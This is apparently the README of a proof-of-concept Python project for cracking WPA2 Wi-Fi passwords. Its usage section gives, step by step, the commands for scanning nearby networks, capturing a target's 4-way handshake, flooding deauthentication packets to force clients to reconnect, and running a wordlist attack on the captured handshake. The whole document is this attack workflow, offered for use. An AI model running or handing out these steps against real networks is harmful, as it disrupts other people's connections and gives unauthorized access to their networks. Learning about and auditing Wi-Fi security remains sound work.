# WPA2-Crack
This a POC to show how a WPA-2 network can be cracked by computing the message integrity check in python.

## Installation
  ```python
  pip3 install -r requirements.txt
  ```
  
## Usage
  We should first run wifi-scan.py to discover wifi network around us.
  The interface needs to be in monitor mode.
  ```python
  python3 wifi-scan.py --interface wlan0
  ```
  
  SSID name, BSSID and channel should be displayed for every wifi network
  We are now ready to capture the 4-Way handshake for a choosen network
  ```python
  python3 wifi-capture-handshake.py --interface wlan0 --bssid xx:xx:xx:xx:xx:xx --channel 1
  ```
  The script is now waiting for an authentication to happen, we can use the wifi-deauth.py script to hurry it
  The script will send deauthencation packets every 0.2 seconds to make an authentication happen
  example:
  ```python
  python3 wifi-deauth.py --interface wlan0 --bssid xx:xx:xx:xx:xx:xx
  ```
  
  Once we captured the wpa-handshake we are ready to start cracking the password
  ```python
  python3 wifi-crack.py --ssid name --wordlist wordlist.txt --pcap pcapfile.pcap
  ```
  We need to be sure to enter the good ssid, because no check is made so the script will never found the password
  
  If the password is in the wordlist, it will be found and displayed to screen.
  
  
